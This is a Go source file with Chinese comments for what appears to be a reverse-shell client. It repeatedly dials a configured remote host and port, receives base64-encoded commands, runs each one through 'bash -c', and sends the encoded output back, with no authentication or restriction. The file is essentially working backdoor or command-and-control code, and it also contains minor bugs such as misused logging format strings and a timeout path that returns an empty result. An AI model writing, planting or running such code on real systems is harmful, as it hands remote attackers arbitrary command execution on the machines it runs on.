package connect

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// var (
// 	// cmd执行超时的秒数
// 	Timeout = 30 * time.Second
// 	charset = "utf-8"
// 	IP      string
// 	ConChan chan net.Conn
// )

type runner struct {
	timeout time.Duration
	gerrors chan error
	charset string
	ipPort  string
	conChan chan net.Conn
}

func new(ip string, port string) (*runner, error) {
	r := runner{
		gerrors: make(chan error),
		timeout: 30 * time.Second,
		charset: "utf-8",
		ipPort:  ip + ":" + port,
		conChan: make(chan net.Conn),
	}

	return &r, nil
}

//创建于serer端的tcp连接
func Connect(ip string, port string) {
	runner, err := new(ip, port)
	if err != nil {
		log.Println(err)
	}

	//开始连接
	go runner.buildConect()

	for conn := range runner.conChan {
		log.Println(conn)
		log.Println("连接成功......")
		message, _ := bufio.NewReader(conn).ReadString('\n')
		decodedCase, _ := base64.StdEncoding.DecodeString(message)
		out, err := RunCommandWithErr(string(decodedCase))
		if err != nil {
			log.Println(err)
		}
		log.Println(out)
		base64Out := base64.StdEncoding.EncodeToString([]byte(out))
		log.Println(base64Out)
		conn.Write([]byte(base64Out + "\n"))
		// buf := make([]byte, 4096)
		// n, _ := conn.Read(buf)
		// log.Println(base64.StdEncoding.DecodeString(string(buf[:n])))
	}

	// go runner.doConnect()
	log.Println("xxxxxxxxxx")
	for {
		time.Sleep(10 * time.Second)
	}
}

func (r *runner) buildConect() {

	for {
		if len(r.conChan) < 1 {
			conn, _ := net.Dial("tcp", r.ipPort)
			// if err != nil {
			// 	fmt.Println(err)
			// }
			if conn != nil {
				r.conChan <- conn
			}
		}

		time.Sleep(r.timeout)
	}

}

//带有错误、超时的命令执行
func RunCommandWithErr(command string, timeoutRaw ...string) (string, error) {
	if len(timeoutRaw) == 0 {
		return runCommandWithError(command)
	}
	var output string
	var err error

	timeout := CalcTimeout(timeoutRaw[0])
	log.Println("Run command with %v seconds timeout", timeout)
	var out string

	c := context.Background()
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	c, cancel := context.WithDeadline(c, deadline)
	defer cancel()
	go func() {
		out, err = runCommandWithError(command)
		cancel()
	}()

	select {
	case <-c.Done():
		return output, err
	case <-time.After(time.Duration(timeout) * time.Second):
		return out, fmt.Errorf("command got timeout")
	}
}

func runCommandWithError(cmd string) (string, error) {
	log.Println("Execute: %s", cmd)
	command := []string{
		"bash",
		"-c",
		cmd,
	}
	var output string
	realCmd := exec.Command(command[0], command[1:]...)

	// output command output to std too
	cmdReader, _ := realCmd.StdoutPipe()
	scanner := bufio.NewScanner(cmdReader)
	go func() {
		for scanner.Scan() {
			out := scanner.Text()
			output += out + "\n"
		}
	}()
	if err := realCmd.Start(); err != nil {
		return output, err
	}
	if err := realCmd.Wait(); err != nil {
		return output, err
	}
	return output, nil
}

func CalcTimeout(raw string) int {
	raw = strings.ToLower(strings.TrimSpace(raw))
	seconds := raw
	multiply := 1

	matched, _ := regexp.MatchString(`.*[a-z]`, raw)
	if matched {
		unitTime := fmt.Sprintf("%c", raw[len(raw)-1])
		seconds = raw[:len(raw)-1]
		switch unitTime {
		case "s":
			multiply = 1
			break
		case "m":
			multiply = 60
			break
		case "h":
			multiply = 3600
			break
		}
	}

	timeout, err := strconv.Atoi(seconds)
	if err != nil {
		return 0
	}
	return timeout * multiply
}
